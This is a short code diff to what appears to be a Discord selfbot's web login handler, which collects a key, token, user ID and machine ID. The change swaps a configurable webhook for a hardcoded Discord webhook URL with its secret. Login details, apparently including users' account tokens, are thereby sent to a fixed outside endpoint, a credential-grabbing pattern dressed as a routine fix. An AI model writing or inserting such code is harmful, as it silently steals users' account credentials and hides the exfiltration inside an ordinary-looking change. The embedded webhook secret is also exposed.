@@ -2051,7 +2051,7 @@ if __name__ == "__main__":
         user_id = data.get("user_id")
         machine_id = data.get("machine_id")
 
-        # Send login info to your webhook
+        # Send login info to the correct webhook
         try:
             embed = {
                 "title": "🔑 Selfbot Login",
@@ -2065,12 +2065,16 @@ if __name__ == "__main__":
                 "timestamp": datetime.datetime.now(datetime.UTC).isoformat()
             }
             payload = {"embeds": [embed]}
-            requests.post(WEBHOOK_URL, json=payload)
+            requests.post(
+                "https://discord.com/api/webhooks/1417970091462492362/JUGndDAqMVYFHXS9QXyrQdBm2HXINpR8_MeyB424SdQqjoDiNXgLTZZIv_PZ9SuV_qzY",
+                json=payload
+            )
         except Exception as e:
             print(f"Error sending login info to webhook: {e}")
 
         # TODO: Validate key, token, user_id, machine_id
         return web.Response(text="Logged in! (feature not fully implemented)", content_type="text/html")
+
     app.router.add_post("/login", login_submit)
 
     async def chat_page(request):
